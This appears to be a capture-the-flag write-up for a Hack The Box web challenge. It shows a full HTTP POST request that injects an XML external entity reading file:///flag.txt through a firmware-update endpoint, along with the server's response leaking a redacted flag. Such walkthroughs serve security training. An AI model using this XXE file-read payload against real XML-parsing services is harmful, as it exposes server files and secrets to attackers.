##### 1. Navigate the web page, only thing that looks like a vector is the update page under the rom tab

##### 2. The update function sends an xml config file to update the character

This looks like a XXE vulnerability

#### 3. Use XXE (XML external entity injection)

by using burpsuite proxy and repeater, you can modify POST requests.

_Modified POST request with XXE vulnerability exploit for flag.txt_

```
POST /api/update HTTP/1.1
Host: 83.136.253.216:55648
Content-Length: 1386
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: http://83.136.253.216:55648
Referer: http://83.136.253.216:55648/rom
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

<!DOCTYPE replace [<!ENTITY idk SYSTEM 'file:///flag.txt'>]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>
 		&idk;
	</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
        <Description>Update includes advanced biometric lock functionality for enhanced security.</Description>
        <Checksum type="SHA-256">9b74c9897bac770ffc029102a200c5de</Checksum>
    </Firmware>
    <Components>
        <Component name="navigation">
            <Version>3.7.2</Version>
            <Description>Updated GPS algorithms for improved wasteland navigation.</Description>
            <Checksum type="SHA-256">e4d909c290d0fb1ca068ffaddf22cbd0</Checksum>
        </Component>
        <Component name="communication">
            <Version>4.5.1</Version>
            <Description>Enhanced encryption for secure communication channels.</Description>
            <Checksum type="SHA-256">88d862aeb067278155c67a6d6c0f3729</Checksum>
        </Component>
        <Component name="biometric_security">
            <Version>2.0.5</Version>
            <Description>Introduces facial recognition and fingerprint scanning for access control.</Description>
            <Checksum type="SHA-256">abcdef1234567890abcdef1234567890</Checksum>
        </Component>
    </Components>
    <UpdateURL>https://satellite-updates.hackthebox.org/firmware/1.33.7/download</UpdateURL>
</FirmwareUpdateConfig>
```

the response:

```
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.12.3
Date: Thu, 02 Jan 2025 00:35:37 GMT
Content-Type: application/json
Content-Length: 134
Connection: close

{
  "message": "Firmware version \nHTB{b*******************************\n update initiated."
}
```
